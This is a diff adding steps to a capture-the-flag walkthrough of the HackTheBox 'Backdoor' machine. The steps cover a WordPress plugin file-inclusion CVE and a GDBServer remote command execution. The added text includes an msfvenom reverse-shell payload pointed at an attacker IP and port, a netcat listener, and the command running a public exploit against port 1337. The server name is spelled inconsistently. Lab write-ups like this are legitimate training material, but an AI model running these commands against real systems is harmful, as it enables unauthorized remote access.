@@ -5,7 +5,9 @@ Machine IP: 10.10.11.125 - Linux
 Difficulty: Easy
 Category: OSCP Preparation
 Vulnerabilities:
-  - Directory Traversal (Local File Inclusion) in ebook-download WordPress plugin (CVE-2016-10924) 
+  - Directory Traversal (Local File Inclusion) in ebook-download WordPress plugin (CVE-2016-10924)
+  - Process ID (PID) Brute-force
+  - GRBServer - Remote Command Execution via ELF Backdoor
 ```
 
 # Reconnaissance
@@ -133,4 +135,34 @@ Nmap done: 1 IP address (1 host up) scanned in 22.51 seconds
 ▶  python CVE-2016-10924-Exploit.py http://backdoor.htb
 ```
 ![image](https://user-images.githubusercontent.com/83878909/237006676-c39bdf84-74ed-47ac-928b-e4975f226db9.png)
-  - 
+  - `GBDServer` is found running on port `1337` which has a process ID of `996`.
+
+---
+
+# Search Exploits
+  - Search exploits for `GDB Server`.
+  - Exploit Reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver
+```CSS
+▶ searchsploit GDBServer
+```
+![image](https://user-images.githubusercontent.com/83878909/237008288-a3df1854-d1dd-4494-bc41-2b0a7f137d68.png)
+![image](https://user-images.githubusercontent.com/83878909/237008944-43295d21-d768-467d-8d10-de2707ace6ea.png)
+
+---
+
+## Exploitation
+  - Generate reverse shell using `msfvenom`.
+```CSS
+▶ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.24 LPORT=4444 PrependFork=true -o reverseshell.bin
+```
+
+  - Start a `netcat` listener on port `4444`.
+```CSS
+▶ nc -nlvvp 4444
+```
+
+  - Run the exploit.
+```CSS
+▶ python 50539.py 10.10.11.125:1337 reverseshell.bin
+```
+
